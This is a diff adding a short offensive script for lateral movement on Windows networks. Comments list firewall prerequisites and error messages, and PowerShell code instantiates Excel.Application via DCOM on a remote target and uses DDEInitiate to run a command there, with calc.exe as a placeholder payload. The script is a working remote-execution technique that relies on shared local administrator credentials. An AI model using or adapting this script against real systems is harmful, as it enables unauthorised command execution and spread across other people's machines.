@@ -1,0 +1,14 @@
+
+#Will only work with Local admin credentials which are same throughout the network. 
+#For this to work in the Windows Advanced Security Firewall  the following ports must be enabled:
+#COM+ Network Access (for port 135)
+#A rule to let dynamic ports for C:\windows\system32\mmc.exe let in. Regular RPC-EPMAP rules from other services won’t work as they only allow traffic to svchost.exe.
+#If the firewall doesn’t let you in, you may receive messages such as:
+#Exception calling “CreateInstance” with “1” argument(s): “Retrieving the COM class factory for remote component with CLSID {49B2791A-B1AE-4C90-9B8E-E860BA07F889} from machine target failed due to the following error: 800706ba target.”
+
+
+powershell -noexit -ExecutionPolicy Unrestricted
+$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "<Target_IP>"))
+$excel.DisplayAlerts = $false
+$excel.DDEInitiate("cmd", "/c calc.exe")
+
